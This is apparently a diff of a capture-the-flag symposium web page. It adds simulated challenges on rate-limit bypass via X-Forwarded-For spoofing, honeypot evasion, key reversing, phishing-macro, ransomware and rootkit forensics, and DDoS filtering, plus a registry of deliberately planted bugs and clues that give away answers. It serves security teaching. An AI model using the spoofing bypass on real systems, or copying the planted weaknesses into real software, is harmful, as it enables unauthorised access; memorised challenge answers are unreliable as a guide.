+                        <button type="button" class="btn-submit-task" id="btn_submit_op_crack" onclick="submitRound2Task('op_crack')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_crack"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 3: BRUTE FORCE & RATE LIMIT BYPASS -->
+                <div class="wf-card" id="card_op_brute">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 03 // ACCESS CONTROL BYPASS</div>
+                            <h3 class="wf-title">Rate-Limit Defeat &amp; 4-Digit Security PIN Bypass</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+250 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_brute">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        The Master Console requires a 4-digit PIN. After 3 failed attempts, the Web Application Firewall locks out the client IP with <code>HTTP 429 Too Many Requests</code>. Bypass this rate limiting by spoofing the reverse-proxy client IP header (<code>X-Forwarded-For: 127.0.0.1</code>) and test the authorization PIN.
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Check the box <strong>Spoof Header: X-Forwarded-For: 127.0.0.1</strong> to trick the gateway into trusting localhost traffic and bypass the 3-attempt IP lockout.<br>
+                        2. Read the maintenance clues below to deduce the 4-digit emergency PIN, enter it, and click <strong>🔑 Test PIN</strong>.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>GATEWAY // EMERGENCY CONSOLE AUTHENTICATOR</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 1rem; align-items: center; margin-bottom: 1rem; flex-wrap: wrap;">
+                            <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--font-mono); font-size: 0.9rem; color: #a0a5c0; cursor: pointer;">
+                                <input type="checkbox" id="spoofHeaderToggle" onchange="toggleIpSpoof()">
+                                🛡️ Spoof Header: <code>X-Forwarded-For: 127.0.0.1</code> (Bypass Rate-Limiter)
+                            </label>
+                            <span id="rateLimitStatus" style="font-family: var(--font-mono); font-size: 0.85rem; color: var(--cyan);">[IP Status: OK (0/3 Failed Tries)]</span>
+                        </div>
+                        <div class="lock-input-group" style="max-width: 100%; margin-bottom: 1rem;">
+                            <input type="text" id="pinInput" class="lock-input" placeholder="Enter 4-digit PIN (e.g. 74XX)" maxlength="4">
+                            <button type="button" class="btn btn-outline" onclick="submitPinBruteForce()">🔑 Test PIN</button>
+                        </div>
+                        <div class="wf-console-output" id="pinOutput">// Enable header spoofing to prevent IP lockout, enter your candidate PIN, and click Test PIN...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_brute')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_brute">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>The gateway locks clients out with <em>HTTP 429 Too Many Requests</em> after 3 failed tries.</li>
+                                <li>Check <strong>Spoof Header: X-Forwarded-For: 127.0.0.1</strong> to trick the proxy into treating requests as internal local loopback traffic, resetting the lockout.</li>
+                                <li>Review the admin maintenance memo: <em>"Emergency PIN is in the 7400-7500 range. The final two digits correspond to the release year of the World Wide Web project (1991 -> 91)."</em> Deduce the 4 digits and click <em>Test PIN</em>!</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_brute" onclick="submitRound2Task('op_brute')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_brute"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 4: HONEYPOT FINGERPRINTING -->
+                <div class="wf-card" id="card_op_honeypot">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 04 // DECEPTION RECONNAISSANCE</div>
+                            <h3 class="wf-title">Honeypot Fingerprinting &amp; Decoy Evasion</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+250 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_honeypot">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        A high-value target server at <code>192.168.100.80</code> has 4 open ports. Three of them are deceptive honeypots (Cowrie SSH decoy, Conpot SCADA decoy, Glastopf Web decoy) designed to entrap attackers. Fingerprint the service banners, identify the single genuine administrative port, and retrieve the clearance flag.
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Probe all four suspect ports to capture their service banners and TCP handshakes.<br>
+                        2. Analyze the heuristic warnings to identify which three are deceptive honeypots (Cowrie, Conpot, Glastopf).<br>
+                        3. Probe the single genuine production service to establish an authenticated administrative session and get the flag.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>RECON // PORT SCANNER &amp; BANNER PROBER (192.168.100.80)</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 0.8rem; margin-bottom: 1rem;">
+                            <button type="button" class="btn btn-outline" onclick="probeHoneypotPort(2222)">🔍 Probe Port 2222</button>
+                            <button type="button" class="btn btn-outline" onclick="probeHoneypotPort(502)">🔍 Probe Port 502</button>
+                            <button type="button" class="btn btn-outline" onclick="probeHoneypotPort(8080)">🔍 Probe Port 8080</button>
+                            <button type="button" class="btn btn-outline" onclick="probeHoneypotPort(9443)">🔍 Probe Port 9443</button>
+                        </div>
+                        <div class="wf-console-output" id="honeypotOutput">// Port prober ready. Click any port above to inspect TCP handshake &amp; service banner...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_honeypot')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_honeypot">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>Honeypots emulate standard protocols but leak signatures in banners (e.g. Python fake SSH shells, emulated PLC Modbus daemons, web decoy traps).</li>
+                                <li>Probe each port one by one and review the terminal heuristic analysis.</li>
+                                <li>Identify which port serves authentic, non-emulated OpenSSL TLS production daemon certificates to establish an admin session and capture the flag.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_honeypot" onclick="submitRound2Task('op_honeypot')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_honeypot"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 5: REVERSE ENGINEERING -->
+                <div class="wf-card" id="card_op_reverse">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 05 // BINARY REVERSE ENGINEERING</div>
+                            <h3 class="wf-title">x86 Assembly Disassembly &amp; Arithmetic Inversion</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+350 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_reverse">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        A proprietary security dongle validates activation keys using this disassembled x86 instruction routine:
+                        <pre style="background: #000; padding: 0.8rem 1rem; border-radius: 6px; font-family: var(--font-mono); color: #00f0ff; margin: 0.8rem 0; font-size: 0.9rem;">
+0x00401000: MOV  EAX, [INPUT_KEY]     ; Load decimal user input
+0x00401005: XOR  EAX, 0x1337          ; Bitwise XOR with 0x1337
+0x0040100A: ADD  EAX, 0x05A0          ; Add decimal 1440 (0x05A0)
+0x0040100F: CMP  EAX, 0x2DEB          ; Compare with target 0x2DEB (11755)
+0x00401014: JE   VALID_KEY_GRANTED    ; If equal -> Unlock flag!
+                        </pre>
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. The assembly logic validates: <code>(Input XOR 0x1337) + 0x05A0 == 0x2DEB (11755)</code>.<br>
+                        2. Invert the operations mathematically in reverse order: subtract <code>0x05A0</code> (1440) from <code>0x2DEB</code> (11755), then bitwise XOR with <code>0x1337</code> (4919).<br>
+                        3. Convert your calculated value to decimal, enter it below, and click <strong>▶ Step Instruction</strong>.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>DEBUGGER // x86 REGISTER CPU EMULATOR</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div class="lock-input-group" style="max-width: 100%; margin-bottom: 1rem;">
+                            <input type="number" id="debuggerInputKey" class="lock-input" placeholder="Enter calculated decimal key (e.g. 15XXX)">
+                            <button type="button" class="btn btn-outline" onclick="stepDebugger()">▶ Step Instruction</button>
+                            <button type="button" class="btn btn-outline" onclick="resetDebugger()">↺ Reset Registers</button>
+                        </div>
+                        <div class="wf-console-output" id="debuggerOutput">// CPU State: EAX=0x00000000 | ZF=0 | Stopped at 0x00401000. Invert the assembly operations and enter the key.</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_reverse')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_reverse">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>Work backwards from target <code>0x2DEB</code> (decimal 11755) to set <code>Zero Flag (ZF) = 1</code>:</li>
+                                <li>Undo <code>ADD EAX, 0x05A0</code>: Subtract <code>0x05A0</code> (decimal 1440) from <code>0x2DEB</code> (decimal 11755).</li>
+                                <li>Undo <code>XOR EAX, 0x1337</code>: Recall that XOR is self-inverting (<code>(A ^ B) ^ B = A</code>). Apply XOR with <code>0x1337</code> (decimal 4919) to your intermediate value.</li>
+                                <li>Convert the resulting hexadecimal value to standard decimal format.</li>
+                                <li>Enter that decimal key and click <em>Step Instruction</em> to unlock the access flag!</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_reverse" onclick="submitRound2Task('op_reverse')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_reverse"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 6: SPEAR PHISHING & MACRO FORENSICS -->
+                <div class="wf-card" id="card_op_phish">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 06 // THREAT INTELLIGENCE</div>
+                            <h3 class="wf-title">Spear-Phishing Forensics &amp; Macro Deobfuscation</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+250 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_phish">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        An executive received an urgent email attachment <code>Q3_Executive_Salary_Review.docm</code>. The email claims to be from the CEO, but contains an embedded malicious VBA macro and encoded PowerShell downloader.
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Click <strong>Step 1: Inspect RFC-5322 Headers</strong> to verify email sender forgery.<br>
+                        2. Click <strong>Step 2: Extract VBA Macro Stream</strong> to inspect the embedded macro payload.<br>
+                        3. Click <strong>Step 3: Deobfuscate PowerShell Payload</strong> to decode the script and uncover the C2 flag.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>FORENSICS // EMAIL &amp; VBA ARTIFACT VIEWER</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 0.8rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-outline" onclick="inspectPhishHeader()">📧 Step 1: Inspect RFC-5322 Headers</button>
+                            <button type="button" class="btn btn-outline" onclick="extractMacro()">📜 Step 2: Extract VBA Macro Stream</button>
+                            <button type="button" class="btn btn-outline" onclick="deobfuscatePayload()">🔓 Step 3: Deobfuscate PowerShell Payload</button>
+                        </div>
+                        <div class="wf-console-output" id="phishOutput">// Click "Step 1: Inspect RFC-5322 Headers" to begin manual forensic investigation...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_phish')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_phish">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>Inspect the RFC-5322 email headers: Notice the mismatch between the claimed <code>From</code> address and the relay <code>Return-Path</code>, along with failed DKIM.</li>
+                                <li>Extract the VBA macro stream to find the obfuscated <code>powershell.exe -EncodedCommand</code> download cradle.</li>
+                                <li>Deobfuscate the Base64 string to uncover the malicious C2 download script and extract the embedded infection flag.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_phish" onclick="submitRound2Task('op_phish')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_phish"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 7: RANSOMWARE MEMORY FORENSICS -->
+                <div class="wf-card" id="card_op_ransom">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 07 // INCIDENT RESPONSE &amp; RECOVERY</div>
+                            <h3 class="wf-title">Ransomware Live Memory Forensics &amp; Defusal</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+400 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_ransom">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        A cyberattack launched <code>CryptLocker_SCADA.exe</code> (PID 4192) on the symposium industrial cooling unit. The binary is encrypting sensor telemetry using AES-256-CBC, but hasn't scrubbed its unallocated process memory heap yet.
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Click <strong>Step 1: Dump Memory Heap (PID 4192)</strong> to extract the AES-256 key &amp; IV from memory.<br>
+                        2. Click <strong>Step 2: Inject Recovered Key &amp; Defuse</strong> to halt the countdown, decrypt the SCADA reactor, and get the flag.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>VOLATILITY // SCADA PROCESS HEAP EXTRACTOR (PID: 4192)</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; flex-wrap: wrap; gap: 0.8rem;">
+                            <div style="font-family: var(--font-mono); color: #ff0055; font-size: 0.95rem;">
+                                ⏱️ DEFUSAL COUNTDOWN: <strong id="ransomCountdown">04:59</strong>
+                            </div>
+                            <div style="display: flex; gap: 0.6rem;">
+                                <button type="button" class="btn btn-outline" onclick="dumpScadaHeap()">💾 Step 1: Dump Memory Heap (PID 4192)</button>
+                                <button type="button" class="btn btn-outline" onclick="revertScadaPayload()">🛡️ Step 2: Inject Recovered Key &amp; Defuse</button>
+                            </div>
+                        </div>
+                        <div class="wf-console-output" id="ransomOutput">// Process PID 4192 active. Click "Step 1: Dump Memory Heap" to inspect RAM strings...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_ransom')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_ransom">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>Click <em>Dump Memory Heap (PID 4192)</em> to inspect process RAM blocks before they are scrubbed.</li>
+                                <li>Scan the memory output to locate the cryptographic string markers <code>AES_KEY=</code> and <code>AES_IV=</code>.</li>
+                                <li>Click <em>Inject Recovered Key &amp; Defuse</em> to decrypt the SCADA cooling valve controller, halt the defusal countdown, and extract the flag.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_ransom" onclick="submitRound2Task('op_ransom')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_ransom"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 8: MALWARE & ROOTKIT DISASSEMBLY -->
+                <div class="wf-card" id="card_op_malware">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 08 // MALWARE ANALYSIS</div>
+                            <h3 class="wf-title">Rootkit Persistence &amp; Kernel Hook Neutralization</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+250 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_malware">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        A stealth Trojan maintains persistence by hijacking the system audio service and installing a hidden kernel filter driver at <code>C:\Windows\System32\drivers\svchost_rootkit.sys</code>.
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Click <strong>Step 1: Scan HKLM Run Keys</strong> to locate the rogue autostart persistence entry.<br>
+                        2. Click <strong>Step 2: Unhook svchost_rootkit.sys</strong> to detach the kernel function hook.<br>
+                        3. Click <strong>Step 3: Delete Persistence Key</strong> to purge the registry entry and recover the flag.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>AUTORUNS // REGISTRY &amp; DRIVER AUDITOR</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 0.8rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-outline" onclick="scanAutoruns()">🔎 Step 1: Scan HKLM Run Keys</button>
+                            <button type="button" class="btn btn-outline" onclick="unhookDriver()">⚡ Step 2: Unhook svchost_rootkit.sys</button>
+                            <button type="button" class="btn btn-outline" onclick="purgeMalwareRegistry()">🗑️ Step 3: Delete Persistence Key</button>
+                        </div>
+                        <div class="wf-console-output" id="malwareOutput">// Ready. Click "Step 1: Scan HKLM Run Keys" to list startup entries...</div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_malware')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_malware">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>Audit the startup keys: Look for an unsigned driver payload hiding under <code>HKLM\...\Run</code>.</li>
+                                <li>Click <em>Unhook svchost_rootkit.sys</em> to detach the SSDT kernel hook and unmask the hidden rootkit process.</li>
+                                <li>Click <em>Delete Persistence Key</em> to shred the driver file, remove the registry autostart entry, and recover the flag.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_malware" onclick="submitRound2Task('op_malware')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_malware"></div>
+                    </div>
+                </div>
+
+                <!-- OPERATION 9: VOLUMETRIC DDOS MITIGATION -->
+                <div class="wf-card" id="card_op_ddos">
+                    <div class="wf-header">
+                        <div>
+                            <div class="wf-op-num">OPERATION 09 // INFRASTRUCTURE DEFENSE</div>
+                            <h3 class="wf-title">Volumetric DDoS NetFlow Analysis &amp; BGP Scrubbing</h3>
+                        </div>
+                        <div class="wf-meta">
+                            <span class="wf-badge-points">+300 PTS</span>
+                            <span class="wf-status-tag pending" id="tag_op_ddos">PENDING</span>
+                        </div>
+                    </div>
+                    <p class="wf-scenario-desc">
+                        A distributed botnet is saturating the symposium border edge router with a 450 Gbps TCP SYN Flood targeting port 443. Analyze the live NetFlow telemetry to isolate the malicious subnet, configure an edge ACL scrubbing rule to DROP packets from the attacking CIDR block, and restore server availability!
+                    </p>
+
+                    <div class="wf-quick-guide">
+                        <strong>🎯 Manual Mission Guide:</strong>
+                        1. Click <strong>Step 1: Capture NetFlow Sample</strong> to analyze live edge telemetry and identify the botnet CIDR block.<br>
+                        2. In the ACL policy builder, select the mitigation Action, the offending Protocol, and type the attacking CIDR subnet from the telemetry report.<br>
+                        3. Click <strong>Step 2: Deploy Scrubbing Rule to Border Edge Router</strong> to drop the attack traffic and recover the flag.
+                    </div>
+
+                    <div class="wf-lab-box">
+                        <div class="wf-lab-topbar">
+                            <span>NETFLOW // LIVE EDGE TRAFFIC TELEMETRY (INTERFACE: eth0)</span>
+                            <div class="wf-lab-term-dots">
+                                <span class="wf-dot red"></span><span class="wf-dot yellow"></span><span class="wf-dot green"></span>
+                            </div>
+                        </div>
+                        <div style="display: flex; gap: 0.8rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-outline" onclick="inspectDdosFlow()">📊 Step 1: Capture NetFlow Sample</button>
+                        </div>
+                        <div class="wf-console-output" id="ddosOutput">// NetFlow collector idle. Click "Step 1: Capture NetFlow Sample" to analyze inbound packet distributions...</div>
+                        
+                        <!-- Scrubbing Rule Builder Form -->
+                        <div style="background: rgba(14, 18, 30, 0.95); padding: 1.2rem; border-radius: 8px; border: 1px solid rgba(0, 240, 255, 0.2); margin-top: 1rem;">
+                            <h4 style="font-family: var(--font-head); font-size: 1rem; color: #fff; margin-bottom: 0.8rem;">EDGE ACL SCRUBBING POLICY BUILDER</h4>
+                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0.8rem; margin-bottom: 1rem;">
+                                <div>
+                                    <label style="font-family: var(--font-mono); font-size: 0.78rem; color: #a0a5c0; display: block; margin-bottom: 0.3rem;">ACTION</label>
+                                    <select id="ddosRuleAction" class="lock-input" style="padding: 0.5rem 0.8rem; width: 100%;">
+                                        <option value="" selected disabled>-- Select Action --</option>
+                                        <option value="ACCEPT">ACCEPT (Allow Traffic)</option>
+                                        <option value="DROP">DROP (Blackhole Subnet)</option>
+                                        <option value="RATE_LIMIT">RATE_LIMIT (100 pps)</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label style="font-family: var(--font-mono); font-size: 0.78rem; color: #a0a5c0; display: block; margin-bottom: 0.3rem;">PROTOCOL</label>
+                                    <select id="ddosRuleProto" class="lock-input" style="padding: 0.5rem 0.8rem; width: 100%;">
+                                        <option value="" selected disabled>-- Select Protocol --</option>
+                                        <option value="TCP_SYN">TCP SYN Flag</option>
+                                        <option value="UDP">UDP Amplification</option>
+                                        <option value="ICMP">ICMP Echo Flood</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label style="font-family: var(--font-mono); font-size: 0.78rem; color: #a0a5c0; display: block; margin-bottom: 0.3rem;">SOURCE CIDR</label>
+                                    <input type="text" id="ddosRuleCidr" class="lock-input" style="padding: 0.5rem 0.8rem; width: 100%;" placeholder="Enter offending CIDR from NetFlow (e.g. 198.51.X.0/24)">
+                                </div>
+                            </div>
+                            <button type="button" class="btn btn-outline" onclick="deployDdosFilter()">🚀 Step 2: Deploy Scrubbing Rule to Border Edge Router</button>
+                        </div>
+                    </div>
+                    <div class="wf-clue-wrapper">
+                        <button type="button" class="wf-clue-toggle" onclick="toggleTacticalClue('op_ddos')">
+                            💡 Tactical Clues &amp; Step-by-Step Guide
+                        </button>
+                        <div class="wf-clue-body" id="clue_op_ddos">
+                            <strong>Tactical Guidance:</strong>
+                            <ol style="margin-left: 1.2rem; margin-top: 0.4rem;">
+                                <li>Click <em>Step 1: Capture NetFlow Sample</em> to observe inbound flows. Identify the top talker subnet generating 98%+ of the saturated TCP SYN traffic.</li>
+                                <li>In the ACL Rule Builder, set Action to <strong>DROP</strong>, Protocol to <strong>TCP SYN Flag</strong>, and specify that offending source CIDR subnet.</li>
+                                <li>Click <em>Step 2: Deploy Scrubbing Rule to Border Edge Router</em>. Inbound link saturation will drop to normal baseline, defending the server and producing the flag.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div class="wf-action-row">
+                        <button type="button" class="btn-submit-task" id="btn_submit_op_ddos" onclick="submitRound2Task('op_ddos')">
+                            SUBMIT
+                        </button>
+                        <div class="wf-op-feedback" id="feedback_op_ddos"></div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Grand Finals Official Submission Card -->
+            <div class="finals-submission-card">
+                <h3 class="fsc-title">🏆 STAGE 2 &amp; GRAND CHAMPIONSHIP SUBMISSION</h3>
+                <p class="fsc-desc">
+                    Ready to finalize your official performance? Submit your completed Stage 2 warfare challenges to the symposium Google Sheet and generate your verified Stage 2 / Grand Championship Certificate.
+                </p>
+                <div class="fsc-actions">
+                    <button type="button" class="btn btn-primary" onclick="openScorecard()">
+                        📜 Open Official Score Sheet &amp; Certificate
+                    </button>
+                    <button type="button" class="btn btn-outline" style="border-color: #ffd700; color: #ffd700;" onclick="submitRound2ToGoogleSheet()">
+                        🚀 Submit Round 2 to Google Sheet (ROUND_DATA)
+                    </button>
+                </div>
+                <div id="finalsSubmitFeedback" style="margin-top: 1.2rem; font-family: var(--font-mono); font-size: 0.95rem;"></div>
+            </div>
+
         </div>
     </section>
 
@@ -1417,6 +2739,38 @@
                         <strong>SYMPOSIUM 2026</strong>
                     </div>
                 </div>
+            </div>
+
+            <!-- Certificate Stage Switcher (Stage 1 / Stage 2 / Grand Total) -->
+            <div class="sheet-stage-tabs">
+                <button type="button" class="sheet-stage-tab active" id="stageTabR1" onclick="setScorecardStage('r1')">
+                    Stage 1: Recon (1,800 PTS)
+                </button>
+                <button type="button" class="sheet-stage-tab" id="stageTabR2" onclick="setScorecardStage('r2')">
+                    Stage 2: Warfare (2,600 PTS)
+                </button>
+                <button type="button" class="sheet-stage-tab" id="stageTabGrand" onclick="setScorecardStage('grand')">
+                    👑 Grand Championship (4,400 PTS)
+                </button>
+            </div>
+
+            <!-- Complete Action Toolbar for Certificate & Sharing -->
+            <div class="scorecard-actions-bar">
+                <button type="button" class="btn btn-primary" onclick="downloadScoreSheetImage('png')">
+                    📥 Download Certificate (PNG)
+                </button>
+                <button type="button" class="btn btn-outline btn-jpg-download" onclick="downloadScoreSheetImage('jpg')">
+                    📥 Download Certificate (JPG)
+                </button>
+                <button type="button" class="btn btn-outline" onclick="copyScoreSummary()">
+                    📋 Copy Text Summary
+                </button>
+                <button type="button" class="btn btn-outline btn-whatsapp-share" onclick="shareToWhatsApp()">
+                    📲 Send to WhatsApp Coordinator
+                </button>
+                <button type="button" class="btn btn-outline" onclick="printScoreSheet()">
+                    🖨️ Print Certificate
+                </button>
             </div>
 
             <!-- Submit to Program Database Section (Stores without encryption + Stored Image) -->
@@ -1699,14 +3053,24 @@
             }
         };
 
+        // ============================================================
+        // 🕵️ OUTSIDE BUGS & EASTER EGGS REGISTRY (12 INTENTIONAL BUGS)
+        // These vulnerabilities exist OUTSIDE regular scenario questions.
+        // Participants/organizers discover them using browser DevTools & inspect tools!
+        // ============================================================
         const BONUS_FLAGS = {
-            "decode{plaintext_database_storage_is_vulnerable}": { points: 100, label: "Unencrypted Database Storage Secret", flag: "DECODE{plaintext_database_storage_is_vulnerable}" },
-            "decode{check_meta_tags_always}": { points: 100, label: "Meta Tag Inspection Secret", flag: "DECODE{check_meta_tags_always}" },
-            "decode{css_vars_leak_secrets}": { points: 100, label: "CSS Variable Leak Secret", flag: "DECODE{css_vars_leak_secrets}" },
-            "decode{elements_hidden_by_css_still_exist}": { points: 100, label: "Hidden CSS DOM Element Secret", flag: "DECODE{elements_hidden_by_css_still_exist}" },
-            "decode{html_comments_are_not_hidden}": { points: 50, label: "HTML Comment Secret", flag: "DECODE{html_comments_are_not_hidden}" },
-            "decode{console_logs_reveal_secrets}": { points: 50, label: "Browser Console Secret", flag: "DECODE{console_logs_reveal_secrets}" },
-            "decode{hidden_divs_are_visible_in_dom}": { points: 50, label: "DOM Data-Flag Secret", flag: "DECODE{hidden_divs_are_visible_in_dom}" }
+            "decode{plaintext_database_storage_is_vulnerable}": { points: 100, label: "Unencrypted Database Storage (CWE-312)", flag: "DECODE{plaintext_database_storage_is_vulnerable}", category: "Database CWE-312" },
+            "decode{check_meta_tags_always}": { points: 100, label: "Meta Tag Inspection Secret (CWE-200)", flag: "DECODE{check_meta_tags_always}", category: "Meta Tag CWE-200" },
+            "decode{css_vars_leak_secrets}": { points: 100, label: "CSS Variable Leak Secret (CWE-540)", flag: "DECODE{css_vars_leak_secrets}", category: "CSS CWE-540" },
+            "decode{elements_hidden_by_css_still_exist}": { points: 100, label: "Hidden CSS DOM Element Secret (CWE-601)", flag: "DECODE{elements_hidden_by_css_still_exist}", category: "DOM CWE-601" },
+            "decode{html_comments_are_not_hidden}": { points: 50, label: "HTML Comment Secret (CWE-615)", flag: "DECODE{html_comments_are_not_hidden}", category: "Source Code CWE-615" },
